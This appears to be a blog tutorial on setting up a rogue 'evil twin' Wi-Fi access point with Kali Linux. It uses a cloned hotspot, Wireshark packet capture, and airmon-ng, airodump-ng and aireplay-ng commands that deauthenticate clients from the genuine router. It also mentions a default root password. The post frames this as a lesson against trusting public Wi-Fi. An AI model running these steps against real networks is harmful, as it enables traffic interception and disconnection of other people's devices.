# Creating a rogue Wi-Fi access point

> Disclaimer: I think it goes without saying that you should only be doing this sort of caper on networks you own. But if nothing else it should disuade you from using public Wi-Fi networks.

Download the latest [Kali Linux ISO](https://www.kali.org/downloads/) and create a [bootable USB drive](https://docs.kali.org/downloading/kali-linux-live-usb-install). Restart your computer and boot into Kali via the BIOS.

You need two network connections so tether your phone with a cable leaving the built-in Wi-Fi for your rogue access point.

_Settings > Wi-Fi > options > Turn On Wi-Fi Hotspot..._

Run `nmtui` and edit the hotspot credentials to match your home network.

## Capturing packets
Capturing packets really is as simple as running Wireshark on the Wi-Fi network interface. Try adding a Wireshark filter and visit https://turpin.dev on your compromised device just so you have some known text to search for.

```
frame contains "turpin"
```

And now we wait for a new device to connect... actually, even established connections re-negotiated periodically but we can make it happen on demand.

## Forcing a reconnection
We _could_ wait but we can also kick out existing sessions by sending a malformed message to the genuine access point.

You'll need two Wi-Fi connections for this: one for the hotspot, one to send malformed packets. So procure a USB-to-Wi-Fi adapter.

List your network interfaces.

ip a

If the built-in Wi-Fi is the hotspot, let's insert the USB Wi-Fi adapter and put it into monitor mode.

airmon-ng start wlan1

Check your network interfaces again and you'll see it has a "mon" suffix. Now see what devices are out there.

airodump-ng wlan1mon --manufacturer

`airodump-ng` lists access points and clients.

```
CH 2 ][ Elapsed: 30 s ][ 2019-11-02 14:06

BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID

A0:BD:CD:8F:D0:2A -66 39 225 100 11 130 WPA2 CCMP PSK pleasedto

BSSID STATION PWR Rate Lost Frames Probe

(not associated) 5C:AA:FD:25:40:DD -64 0 - 0 28 4 Sonos_fLNwUn2QJ
```

Deauthenticate the target.

aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1

See the [aircrack documentation](https://www.aircrack-ng.org/doku.php?id=deauthentication).

## Tidying up after yourself
When you're done take the network interface out of monitor mode and restart your network. But you can just turn off if you don't care. Should the Kali screensaver kick in the default root password is "toor" (root backwards).

airmon-ng stop wlan1mon
systemctl restart network-manager.service
